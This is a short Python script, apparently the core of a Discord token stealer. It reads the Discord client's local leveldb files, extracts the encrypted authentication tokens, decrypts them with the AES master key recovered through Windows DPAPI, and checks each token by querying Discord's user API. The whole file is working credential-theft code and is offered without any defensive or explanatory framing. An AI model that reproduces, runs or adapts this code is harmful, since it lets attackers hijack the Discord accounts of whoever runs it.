import os, re, base64, json, requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

def _decrypt_val(buffer: bytes, master_key: bytes):
    iv = buffer[3:15]
    payload = buffer[15:]

    cipher = AES.new(master_key, AES.MODE_GCM, iv)

    decrypted = cipher.decrypt(payload)
    decrypted = decrypted[:-16].decode()

    return decrypted

def _get_master_key(path: str):
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
       
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

        return CryptUnprotectData(master_key, None, None, None, 0)[1]

def get_tokens(debug: bool = False):
    path = str(os.getenv("appdata")) + "/discord/Local Storage/leveldb"
    tokens: list[str] = []

    for filename in os.listdir(path):
        if filename[-3:] not in ["log", "ldb"]:
            continue

        for line in [x.strip() for x in open(f"{path}\\{filename}", errors = "ignore").readlines() if x.strip()]:
            for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                try:
                    token = _decrypt_val(
                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]),
                        _get_master_key(f"{os.getenv("appdata")}\\discord\\Local State")
                    )

                    if token not in tokens:
                        tokens.append(token)
    
                except Exception as e:
                    if debug:
                        print(str(e))
    
    return tokens

def get_user(token: str) -> dict[str, str | int | None]:
    header = { "authorization": token }
    
    r = requests.get(f"https://discord.com/api/v9/users/@me", headers = header)
    return json.loads(r.text)

def is_valid(token: str):
    user = get_user(token)

    if user.get("id"):
        return user
    
    return False